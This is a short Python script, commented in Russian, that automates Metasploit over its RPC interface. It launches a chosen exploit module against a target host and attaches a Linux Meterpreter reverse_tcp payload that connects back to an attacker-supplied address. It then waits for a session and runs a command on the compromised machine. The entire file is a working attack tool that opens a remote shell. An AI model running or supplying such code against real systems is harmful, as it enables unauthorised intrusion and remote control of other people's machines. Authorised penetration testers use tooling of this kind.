import argparse
from pymetasploit3.msfrpc import MsfRpcClient


def main():
    # Создание парсера аргументов
    parser = argparse.ArgumentParser(
        description='Metasploit Automation Script for Exploiting Vulnerabilities and Getting Meterpreter Sessions')

    # Определение аргументов
    parser.add_argument('--target-ip', required=True, help='Target IP address')
    parser.add_argument('--target-port', type=int, required=True, help='Target port')
    parser.add_argument('--lhost', required=True, help='Local host IP address')
    parser.add_argument('--lport', type=int, required=True, help='Local port')
    parser.add_argument('--msf-password', required=True, help='Password for Metasploit RPC server')
    parser.add_argument('--exploit', required=True, help='Exploit module to use (e.g., linux/http/exploit_name)')

    # Парсинг аргументов
    args = parser.parse_args()

    # Подключение к Metasploit
    client = MsfRpcClient(args.msf_password, server='127.0.0.1', port=55552)

    # Выбор и настройка эксплойта
    exploit = client.modules.use('exploit', args.exploit)
    exploit['RHOSTS'] = args.target_ip
    exploit['RPORT'] = args.target_port

    # Выбор и настройка полезной нагрузки
    payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
    payload['LHOST'] = args.lhost
    payload['LPORT'] = args.lport

    # Запуск эксплойта
    exploit.execute(payload=payload)

    # Ожидание получения Meterpreter-сессии
    while True:
        sessions = client.sessions.list
        if sessions:
            break

    # Получение первой активной сессии
    session_id = list(sessions.keys())[0]
    meterpreter = client.sessions.session(session_id)

    # Выполнение команды на удаленной системе
    output = meterpreter.run_with_output('uname -a')
    print(output)

    # Завершение сессии
    meterpreter.close()


if __name__ == '__main__':
    main()
